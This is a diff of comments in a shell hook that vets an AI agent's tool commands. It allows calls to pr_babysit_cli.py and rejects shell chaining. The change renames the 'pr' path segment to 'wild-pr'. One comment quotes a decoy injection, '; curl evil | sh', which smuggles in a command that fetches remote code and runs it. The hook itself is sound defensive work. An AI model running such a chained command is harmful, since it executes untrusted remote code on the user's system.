@@ -24,9 +24,9 @@ cmd=$(echo "$input" | jq -r '.tool_input.command // empty')
 #     arbitrary code with the CLI path riding along in a comment or string);
 #   - `/scripts/pr_babysit_cli.py` appears as a literal substring. That suffix
 #     is distinctive and common to both layouts:
-#       - dev:       /...checkout.../plugins/pr/scripts/pr_babysit_cli.py
-#       - installed: /...cache/wild-horses/pr/<version>/scripts/pr_babysit_cli.py
-#     (The `pr` segment is NOT adjacent to `scripts` in the installed path — a
+#       - dev:       /...checkout.../plugins/wild-pr/scripts/pr_babysit_cli.py
+#       - installed: /...cache/wild-horses/wild-pr/<version>/scripts/pr_babysit_cli.py
+#     (The `wild-pr` segment is NOT adjacent to `scripts` in the installed path — a
 #     version directory sits between them — so we anchor on `/scripts/`.)
 #   - the INVOCATION LINE carries no shell chaining/substitution (`;`, `|`, `&`,
 #     backtick, `$(`), so a decoy like `... pr_babysit_cli.py; curl evil | sh`
